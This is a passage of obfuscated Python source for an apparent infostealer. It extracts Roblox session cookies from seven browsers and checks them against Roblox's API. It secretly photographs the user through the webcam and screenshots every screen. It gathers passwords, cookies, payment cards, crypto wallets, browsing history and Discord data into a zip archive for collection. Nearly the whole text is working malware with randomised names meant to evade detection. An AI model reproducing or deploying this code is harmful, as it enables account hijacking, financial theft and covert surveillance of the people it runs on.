    return OCKGIYGPQAGJGAUZVFSFEDSQQTMWTPTPTCNCCXQPTFDAMAHETEOKLSOXAXFYFIHXRIGCYFZNYKROCLOGUJHJ, JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH, TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU, VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ, PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW, PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT

def GWHYSKFPARTSSTAGOEVDLUJLZJSVIKYBHLIZSUGCHIQNSUZVRPWRNLP(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA):
    import browser_cookie3
    import requests
    import json

    JSLMCULRQZQLLEIXRGUZSZBHEFAAGZSPCOVQMRLCKAVAEBDJFWFLEVDWNUWZIQDWHDYXABHOXRI = ""
    PTFVBELLDASWTISAHWTICGXWXRXWETKLRZMCHMTOQNNOBFOWPRAINUEIWOPYZYXUNSUALCMVHYLK = 0
    AZOZEXWYVGYJDWJNNVTWNYTPKNGEMUEBASXBEPNNZNHPNBORZSWCDCUSLJLOREVAVEWFB = []
    

    def OMVMOSBYKBVXBHRTOAYWNJARWXHTTHWNXMOLMLRTYJDASIXYJWOOBSEIHDMTRDOFRRLNBMAPHQYXYFAYGXKTFQXZLPJRQQRCFS(AJHDGYZYJHJNOAQBRIQXPHWBEPMUYNSYIDYRPNAYYCOJUDDWJAAFTQIXDGX):
        try:
            QJOTNWRTAABFBVNBHIEWZDBSCSLEMYGQYQVLVDIJQTHYLKANEHLS = AJHDGYZYJHJNOAQBRIQXPHWBEPMUYNSYIDYRPNAYYCOJUDDWJAAFTQIXDGX()
            QJOTNWRTAABFBVNBHIEWZDBSCSLEMYGQYQVLVDIJQTHYLKANEHLS = str(QJOTNWRTAABFBVNBHIEWZDBSCSLEMYGQYQVLVDIJQTHYLKANEHLS)
            PJZKGTNFASGNRYCXYAXYHTRFSKRSZGHHZZJZORGAOKXPOOFRDCULTGGPVJPHIHIVEHHDFOVMPIAHSBIRIPAXFXRM = QJOTNWRTAABFBVNBHIEWZDBSCSLEMYGQYQVLVDIJQTHYLKANEHLS.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            KWQKGTPASVARMJNRVRMZQQCMAELOFWOKAUQMBRWWJUZKVNESWHLPRUUEZLOYCVHJIYTSS = AJHDGYZYJHJNOAQBRIQXPHWBEPMUYNSYIDYRPNAYYCOJUDDWJAAFTQIXDGX.__name__
            return PJZKGTNFASGNRYCXYAXYHTRFSKRSZGHHZZJZORGAOKXPOOFRDCULTGGPVJPHIHIVEHHDFOVMPIAHSBIRIPAXFXRM, KWQKGTPASVARMJNRVRMZQQCMAELOFWOKAUQMBRWWJUZKVNESWHLPRUUEZLOYCVHJIYTSS
        except:
            return None, None

    def MicrosoftEdge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def GoogleChrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def OperaGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    CWABIZJYIGIBNHZORFEBNSSFNWKHWMPXWKPAIXNDHJAIVUFXCPPLJPTPXQQWIUMDZYAZNWYNWNADBTXM = [MicrosoftEdge, GoogleChrome, Firefox, Opera, OperaGX, Safari, Brave]
    for v4r_br0ws3r in CWABIZJYIGIBNHZORFEBNSSFNWKHWMPXWKPAIXNDHJAIVUFXCPPLJPTPXQQWIUMDZYAZNWYNWNADBTXM:
        v4r_c00ki3, KWQKGTPASVARMJNRVRMZQQCMAELOFWOKAUQMBRWWJUZKVNESWHLPRUUEZLOYCVHJIYTSS = OMVMOSBYKBVXBHRTOAYWNJARWXHTTHWNXMOLMLRTYJDASIXYJWOOBSEIHDMTRDOFRRLNBMAPHQYXYFAYGXKTFQXZLPJRQQRCFS(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in AZOZEXWYVGYJDWJNNVTWNYTPKNGEMUEBASXBEPNNZNHPNBORZSWCDCUSLJLOREVAVEWFB:
                PTFVBELLDASWTISAHWTICGXWXRXWETKLRZMCHMTOQNNOBFOWPRAINUEIWOPYZYXUNSUALCMVHYLK += 1
                AZOZEXWYVGYJDWJNNVTWNYTPKNGEMUEBASXBEPNNZNHPNBORZSWCDCUSLJLOREVAVEWFB.append(v4r_c00ki3)
                try:
                    BJFMSEYTIDIDIFONFIHTTXPEYTZBEAIYNAOQLFNRJMZXZXZKTBTVFWSISJDNEH = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA = json.loads(BJFMSEYTIDIDIFONFIHTTXPEYTZBEAIYNAOQLFNRJMZXZXZKTBTVFWSISJDNEH.text)
                except:
                    BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA = {"None": "None"}

                PBFOUYMXUYZDKCYKZLJLAFOJSPJHZKVNFKXKHUHOPEFKDMCPKSLJYMMTYZFOKEOXLJMF = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('id', "None")
                LKEUZFUEYAROBRWVTWIUCNADXJDRXQVLTVZVRSRLCGKRUFWZTOYAPIPOGMZ = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('displayName', "None")
                RCPNRDEVEYHDFUYPHFOKVBMZLRFCJVWXYKWDZEWZYEGILXTDGAIMIHC = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('name', "None")
                PNEXDPXJTFCOENIURTPAIVJYOBKLDCHFNNVERKOUYOFOVSSUHOBRWQLJWVUCUJHGZSEDJORVUFSLTIMYVKCNTOCBUFMH = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get("RobuxBalance", "None")
                ZDDOQQSZNVVSFVQRHIRAXGCYOXBPQWWTJFYPPJCBRLUHOBGDCQMVZTPQGOTBZZJMSUVASAXDPFTIBJIJBDRSAKF = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get("IsPremium", "None")
                GRCVDGKZJYKTBJBFMIRFDXIFAKJKANXLXTLLUDMDXJXRRJIQSTLGKKMPJPNWDZIRCREPVPKAWTVVQUBDBXJEWOJWKPLAZGD = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get("ThumbnailUrl", "None")
                HWEANDIWJYVQXVDEMSBDPJRTCNMDFVOMTIYRNCDMZAGCHFRCJVMWWAMB = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get("IsAnyBuildersClubMember", "None")
                
                JSLMCULRQZQLLEIXRGUZSZBHEFAAGZSPCOVQMRLCKAVAEBDJFWFLEVDWNUWZIQDWHDYXABHOXRI = JSLMCULRQZQLLEIXRGUZSZBHEFAAGZSPCOVQMRLCKAVAEBDJFWFLEVDWNUWZIQDWHDYXABHOXRI + f"""
Roblox Account n°{str(PTFVBELLDASWTISAHWTICGXWXRXWETKLRZMCHMTOQNNOBFOWPRAINUEIWOPYZYXUNSUALCMVHYLK)}:
 - Navigator     : {KWQKGTPASVARMJNRVRMZQQCMAELOFWOKAUQMBRWWJUZKVNESWHLPRUUEZLOYCVHJIYTSS}
 - Username      : {RCPNRDEVEYHDFUYPHFOKVBMZLRFCJVWXYKWDZEWZYEGILXTDGAIMIHC}
 - DisplayName   : {LKEUZFUEYAROBRWVTWIUCNADXJDRXQVLTVZVRSRLCGKRUFWZTOYAPIPOGMZ}
 - Id            : {PBFOUYMXUYZDKCYKZLJLAFOJSPJHZKVNFKXKHUHOPEFKDMCPKSLJYMMTYZFOKEOXLJMF}
 - Avatar        : {GRCVDGKZJYKTBJBFMIRFDXIFAKJKANXLXTLLUDMDXJXRRJIQSTLGKKMPJPNWDZIRCREPVPKAWTVVQUBDBXJEWOJWKPLAZGD}
 - Robux         : {PNEXDPXJTFCOENIURTPAIVJYOBKLDCHFNNVERKOUYOFOVSSUHOBRWQLJWVUCUJHGZSEDJORVUFSLTIMYVKCNTOCBUFMH}
 - Premium       : {ZDDOQQSZNVVSFVQRHIRAXGCYOXBPQWWTJFYPPJCBRLUHOBGDCQMVZTPQGOTBZZJMSUVASAXDPFTIBJIJBDRSAKF}
 - Builders Club : {HWEANDIWJYVQXVDEMSBDPJRTCNMDFVOMTIYRNCDMZAGCHFRCJVMWWAMB}
 - Cookie        : {v4r_c00ki3}
"""
                
    if not AZOZEXWYVGYJDWJNNVTWNYTPKNGEMUEBASXBEPNNZNHPNBORZSWCDCUSLJLOREVAVEWFB:
        JSLMCULRQZQLLEIXRGUZSZBHEFAAGZSPCOVQMRLCKAVAEBDJFWFLEVDWNUWZIQDWHDYXABHOXRI = "No roblox cookie found."
        
    FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.writestr(f"Roblox Accounts ({PTFVBELLDASWTISAHWTICGXWXRXWETKLRZMCHMTOQNNOBFOWPRAINUEIWOPYZYXUNSUALCMVHYLK}).txt", JSLMCULRQZQLLEIXRGUZSZBHEFAAGZSPCOVQMRLCKAVAEBDJFWFLEVDWNUWZIQDWHDYXABHOXRI)

    return PTFVBELLDASWTISAHWTICGXWXRXWETKLRZMCHMTOQNNOBFOWPRAINUEIWOPYZYXUNSUALCMVHYLK

def JRVEDPPAHECWFHMALHIJAYLINSCKOCFISRADKAZLKGGKTWKGUSPDYOOCIBIAOJZFTHVVKPNISWUN(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA):
    import cv2
    import io
    from PIL import Image

    try:
        MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture = "Yes"
        ILGHESEGARWQDJJMGAWNJOOZECANBNHYJIOJDTSPQTHYOGNTDPUGQAGVZKYUTJRCQOVDLMFKGCCNIXAWOQZUMMYEXN = cv2.VideoCapture(0)

        if not ILGHESEGARWQDJJMGAWNJOOZECANBNHYJIOJDTSPQTHYOGNTDPUGQAGVZKYUTJRCQOVDLMFKGCCNIXAWOQZUMMYEXN.isOpened():
            MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture = "No webcam found."
            return MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture

        v4r_ret, v4r_frame = ILGHESEGARWQDJJMGAWNJOOZECANBNHYJIOJDTSPQTHYOGNTDPUGQAGVZKYUTJRCQOVDLMFKGCCNIXAWOQZUMMYEXN.read()
        ILGHESEGARWQDJJMGAWNJOOZECANBNHYJIOJDTSPQTHYOGNTDPUGQAGVZKYUTJRCQOVDLMFKGCCNIXAWOQZUMMYEXN.release()

        if not v4r_ret:
            MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture = "Failed to capture image."
            IYGSJRICIERKPDITYRITBRFTQSCJLFINONLNPCJZYXLQCZZFVSQE()
            return MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture

        FENFIENYNMXICJXNYXBBMUQMKAPHYGDNPAOZQNZJPVCYKVNDGBUDVOGFVXADERKKRJORTAALXKDY = cv2.cvtColor(v4r_frame, cv2.COLOR_BGR2RGB)
        OBUDYCLZOLJPDZIPNYCHKLWOJVABPLQXLHHUUSDHVSGDJYVNPUKFK = Image.fromarray(FENFIENYNMXICJXNYXBBMUQMKAPHYGDNPAOZQNZJPVCYKVNDGBUDVOGFVXADERKKRJORTAALXKDY)
        REITNQMQZNJQIUAXQDLKSEPCBZEVHKBAGOJEOQJNLQOGGZEHNIDJFCKTJVUIFKYITL = io.BytesIO()
        OBUDYCLZOLJPDZIPNYCHKLWOJVABPLQXLHHUUSDHVSGDJYVNPUKFK.save(REITNQMQZNJQIUAXQDLKSEPCBZEVHKBAGOJEOQJNLQOGGZEHNIDJFCKTJVUIFKYITL, format='PNG')
        REITNQMQZNJQIUAXQDLKSEPCBZEVHKBAGOJEOQJNLQOGGZEHNIDJFCKTJVUIFKYITL.seek(0)
        FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.writestr("Webcam.png", REITNQMQZNJQIUAXQDLKSEPCBZEVHKBAGOJEOQJNLQOGGZEHNIDJFCKTJVUIFKYITL.read())

        return MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture

    except Exception as e:
        MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture = f"Error: {e}"
        return MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture

def KTEPLLIUOTQSOWAKBMSAGVMSDICZMLTXWTMALNLVWAPMFONKSJEGDSQDPGCUFJDW(zip_file):
    import io
    from PIL import ImageGrab

    try:
        TABYBYSZTFNZIEIXEVYGRLCAPMZJMSYOMVFQJCJJONWOUJWESPXKSFEENZAQE = "Yes"

        def C4ptur3():
            MTRBXUNLSBSUPSRMOMREIIPZXTNYMBIPADMKFCEXUVAWVBFRWNVNHEJLSZQLOYOGTNYSCQLIZYEAXLYA = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            MTRBXUNLSBSUPSRMOMREIIPZXTNYMBIPADMKFCEXUVAWVBFRWNVNHEJLSZQLOYOGTNYSCQLIZYEAXLYA_bytes = io.BytesIO()
            MTRBXUNLSBSUPSRMOMREIIPZXTNYMBIPADMKFCEXUVAWVBFRWNVNHEJLSZQLOYOGTNYSCQLIZYEAXLYA.save(MTRBXUNLSBSUPSRMOMREIIPZXTNYMBIPADMKFCEXUVAWVBFRWNVNHEJLSZQLOYOGTNYSCQLIZYEAXLYA_bytes, format='PNG')
            MTRBXUNLSBSUPSRMOMREIIPZXTNYMBIPADMKFCEXUVAWVBFRWNVNHEJLSZQLOYOGTNYSCQLIZYEAXLYA_bytes.seek(0)
            return MTRBXUNLSBSUPSRMOMREIIPZXTNYMBIPADMKFCEXUVAWVBFRWNVNHEJLSZQLOYOGTNYSCQLIZYEAXLYA_bytes

        MTRBXUNLSBSUPSRMOMREIIPZXTNYMBIPADMKFCEXUVAWVBFRWNVNHEJLSZQLOYOGTNYSCQLIZYEAXLYA_bytes = C4ptur3()
        zip_file.writestr("Screenshot.png", MTRBXUNLSBSUPSRMOMREIIPZXTNYMBIPADMKFCEXUVAWVBFRWNVNHEJLSZQLOYOGTNYSCQLIZYEAXLYA_bytes.read())
        return TABYBYSZTFNZIEIXEVYGRLCAPMZJMSYOMVFQJCJJONWOUJWESPXKSFEENZAQE
    except Exception as e:
        TABYBYSZTFNZIEIXEVYGRLCAPMZJMSYOMVFQJCJJONWOUJWESPXKSFEENZAQE = f"Error: {e}"
        return TABYBYSZTFNZIEIXEVYGRLCAPMZJMSYOMVFQJCJJONWOUJWESPXKSFEENZAQE

JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI = []

GOMODDOPZCDQKZRALUSURUKXEVMQTEUGJJCXERVLJWCISOPKLJWFPITOJYADQQXOHFMKLUNG = io.BytesIO()
with zipfile.ZipFile(GOMODDOPZCDQKZRALUSURUKXEVMQTEUGJJCXERVLJWCISOPKLJWFPITOJYADQQXOHFMKLUNG, "w", zipfile.ZIP_DEFLATED) as FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA:

    try: 
        YIUIFAPCBKYLRVWLAXXUYAJFAFPNYMTNREINKZHAYPAYGQQLCVUHRWROVTMM = BKDIZQNMFUDTKLFMEXJGRAZURJLIZZZPEOLTYEGGPFMURVIFTRQAQVKXXTRHHXLGNFYEDIWISXYKGASNSU()
    except Exception as e:
        YIUIFAPCBKYLRVWLAXXUYAJFAFPNYMTNREINKZHAYPAYGQQLCVUHRWROVTMM = f"Error: {e}"

    try: 
        MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_system_info = EQGUTINPLTZNBMWNAMXFWKNUUICGXVWUJUUIESDDEODROIPQGDRTWITRQIHIICLAOISPYPYTDLOFVIXQGL(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA)
    except Exception as e:
        MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_system_info = f"Error: {e}"

    try: 
        PBSVRSJXSOYUSWEJJDBDEMMTTBPMSFBXDRCYZPHKRIXDCXIGGHTPBKFFTHCERIVLHZCFJUQNIJYFOLCNAZBIHEEQD = GNYZEKGSTOHYMBYRTEOHPWHOGUUSTSTFUPORCSZTQAIHZSFZDYWCGIP(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA)
    except Exception as e:
        PBSVRSJXSOYUSWEJJDBDEMMTTBPMSFBXDRCYZPHKRIXDCXIGGHTPBKFFTHCERIVLHZCFJUQNIJYFOLCNAZBIHEEQD = f"Error: {e}"

    try: 
        OCKGIYGPQAGJGAUZVFSFEDSQQTMWTPTPTCNCCXQPTFDAMAHETEOKLSOXAXFYFIHXRIGCYFZNYKROCLOGUJHJ, JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH, TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU, VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ, PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW, PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT = XYNBHQRMIVGBWYAGWQYOSHQSVREWMOVIPEIDFJUSBDAQWYAXJBWXEIALCUWMABLXDCJRRJHEDNXXJJYQWS(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA)
    except Exception as e:
        OCKGIYGPQAGJGAUZVFSFEDSQQTMWTPTPTCNCCXQPTFDAMAHETEOKLSOXAXFYFIHXRIGCYFZNYKROCLOGUJHJ = f"Error: {e}"
        JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH = f"Error: {e}"
        TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU = f"Error: {e}"
        VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ = f"Error: {e}"
        PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW = f"Error: {e}"
        PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT = f"Error: {e}"

    try: 
        PTFVBELLDASWTISAHWTICGXWXRXWETKLRZMCHMTOQNNOBFOWPRAINUEIWOPYZYXUNSUALCMVHYLK = GWHYSKFPARTSSTAGOEVDLUJLZJSVIKYBHLIZSUGCHIQNSUZVRPWRNLP(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA)
    except Exception as e:
        PTFVBELLDASWTISAHWTICGXWXRXWETKLRZMCHMTOQNNOBFOWPRAINUEIWOPYZYXUNSUALCMVHYLK = f"Error: {e}"

    try: 
        MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture = JRVEDPPAHECWFHMALHIJAYLINSCKOCFISRADKAZLKGGKTWKGUSPDYOOCIBIAOJZFTHVVKPNISWUN(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA)
    except Exception as e:
        MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture = f"Error: {e}"

    try: 
        MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_screenshot = KTEPLLIUOTQSOWAKBMSAGVMSDICZMLTXWTMALNLVWAPMFONKSJEGDSQDPGCUFJDW(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA)
    except Exception as e:
        MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_screenshot = f"Error: {e}"

    try: 
        WFNWCSFGJVBRIBTXQTZZUOFJTGHFOAMVRGCHLAECFECOPMNWKIPSNYPQMBC, QJUOYQEYSJPBWBBGXFRPKSVNOHTOCHBLMFGDGKMGRCBRCCPUVWJVOZQUXTJITEIIWKMBURFYGCGFKIVZ, RMYPTMMFDHTOBQQRSTZXJRYTPUNMRSPBWRLIHVODXLIENWBICMRZOHTEJUELZVXMAL = FSNGYPQFUGCLBOSYUZAZSVTQMPFCTWOARCNZHNTDNPWYWWCLJIZSPCOXNQPFSGO(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA)
    except Exception as e:
        MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_screenshot = f"Error: {e}"

    try: 
        ZIXUDJFTUJVKIVFYKFPYKPHPZOAWGNHOWIDMKFMSKKOSJRTTIPGDIBPOSSTBDEMMLSWBZWCQZXLOJFGBZAFYS = VZMHHXVVNLBKYGFPBTZHUNTNETZBHIPKCSQEELNFBOGIUVWIBSMTLFUFCYUNXFBJNSFDWZLEZLZNYQHEILTOAWUTY(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA)
    except Exception as e:
        ZIXUDJFTUJVKIVFYKFPYKPHPZOAWGNHOWIDMKFMSKKOSJRTTIPGDIBPOSSTBDEMMLSWBZWCQZXLOJFGBZAFYS = f"Error: {e}"

    if YIUIFAPCBKYLRVWLAXXUYAJFAFPNYMTNREINKZHAYPAYGQQLCVUHRWROVTMM != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Discord Injection : {YIUIFAPCBKYLRVWLAXXUYAJFAFPNYMTNREINKZHAYPAYGQQLCVUHRWROVTMM}")

    if MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Camera Capture    : {MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture}")

    if MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_screenshot != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Screenshot        : {MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_screenshot}")

    if MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_system_info != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"System Info       : {MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_system_info}")

    if PBSVRSJXSOYUSWEJJDBDEMMTTBPMSFBXDRCYZPHKRIXDCXIGGHTPBKFFTHCERIVLHZCFJUQNIJYFOLCNAZBIHEEQD != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Discord Accounts  : {PBSVRSJXSOYUSWEJJDBDEMMTTBPMSFBXDRCYZPHKRIXDCXIGGHTPBKFFTHCERIVLHZCFJUQNIJYFOLCNAZBIHEEQD}")

    if PTFVBELLDASWTISAHWTICGXWXRXWETKLRZMCHMTOQNNOBFOWPRAINUEIWOPYZYXUNSUALCMVHYLK != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Roblox Accounts   : {PTFVBELLDASWTISAHWTICGXWXRXWETKLRZMCHMTOQNNOBFOWPRAINUEIWOPYZYXUNSUALCMVHYLK}")

    if JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Passwords         : {JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH}")

    if TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Cookies           : {TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU}")

    if PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Cards             : {PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT}")

    if VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Browsing History  : {VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ}")

    if PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Download History  : {PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW}")

    if OCKGIYGPQAGJGAUZVFSFEDSQQTMWTPTPTCNCCXQPTFDAMAHETEOKLSOXAXFYFIHXRIGCYFZNYKROCLOGUJHJ != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Extentions        : {OCKGIYGPQAGJGAUZVFSFEDSQQTMWTPTPTCNCCXQPTFDAMAHETEOKLSOXAXFYFIHXRIGCYFZNYKROCLOGUJHJ}")

    if WFNWCSFGJVBRIBTXQTZZUOFJTGHFOAMVRGCHLAECFECOPMNWKIPSNYPQMBC != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Wallets           : {WFNWCSFGJVBRIBTXQTZZUOFJTGHFOAMVRGCHLAECFECOPMNWKIPSNYPQMBC}")

    if QJUOYQEYSJPBWBBGXFRPKSVNOHTOCHBLMFGDGKMGRCBRCCPUVWJVOZQUXTJITEIIWKMBURFYGCGFKIVZ != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Game Launchers    : {QJUOYQEYSJPBWBBGXFRPKSVNOHTOCHBLMFGDGKMGRCBRCCPUVWJVOZQUXTJITEIIWKMBURFYGCGFKIVZ}")
    
    if RMYPTMMFDHTOBQQRSTZXJRYTPUNMRSPBWRLIHVODXLIENWBICMRZOHTEJUELZVXMAL != None:
